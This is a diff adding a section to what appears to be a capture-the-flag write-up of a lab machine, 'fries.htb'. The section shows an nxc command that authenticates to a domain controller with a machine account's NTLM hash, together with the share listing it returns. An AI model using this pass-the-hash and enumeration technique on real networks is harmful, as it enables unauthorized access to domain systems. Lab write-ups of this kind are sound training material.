@@ -816,7 +816,27 @@ SMB         10.129.244.72   445    DC01             [+] fries.htb\web$:61e359990
 
 Now i can do some domain enumeration
 
+# Domain enumeration as `web$`
 
+```python
+nxc smb dc01.fries.htb -u 'web$' -H '61e3599900d7a81c373bcbaaa755bdb2' --shares
+SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.72   445    DC01             [+] fries.htb\web$:61e3599900d7a81c373bcbaaa755bdb2 
+SMB         10.129.244.72   445    DC01             [*] Enumerated shares
+SMB         10.129.244.72   445    DC01             Share           Permissions     Remark
+SMB         10.129.244.72   445    DC01             -----           -----------     ------
+SMB         10.129.244.72   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.244.72   445    DC01             C$                              Default share
+SMB         10.129.244.72   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.244.72   445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.244.72   445    DC01             SYSVOL          READ            Logon server share
+```
+
+Read access on default shares
+
+```python
+
+```
 
 
 
